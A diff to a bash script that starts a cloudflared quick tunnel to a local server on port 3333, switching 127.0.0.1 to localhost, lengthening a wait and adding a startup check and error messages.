@@ -266,12 +266,16 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
 rm -rf .cloudflared_output.log > /dev/null 2>&1 &
 
 if [[ "$windows_mode" == true ]]; then
-    ./cloudflared.exe tunnel --url http://127.0.0.1:3333 > .cloudflared_output.log 2>&1 &
+    ./cloudflared.exe tunnel --url http://localhost:3333 > .cloudflared_output.log 2>&1 &
 else
-    ./cloudflared tunnel --url http://127.0.0.1:3333 > .cloudflared_output.log 2>&1 &
+    ./cloudflared tunnel --url http://localhost:3333 > .cloudflared_output.log 2>&1 &
 fi
 
-sleep 15
+sleep 20
+if [[ ! -f .cloudflared_output.log ]]; then
+    printf "\e[1;31m[!] Cloudflared failed to start or executable not found\e[0m\n"
+    exit 1
+fi
 link=$(grep -o 'https://[^ ]*\.trycloudflare.com' ".cloudflared_output.log")
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
@@ -279,8 +283,8 @@ printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might b
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run this command killall cloudflared\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url http://127.0.0.1:3333 to see specific errors\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url http://127.0.0.1:3333\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url http://localhost:3333 to see specific errors\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url http://localhost:3333\n"
 exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
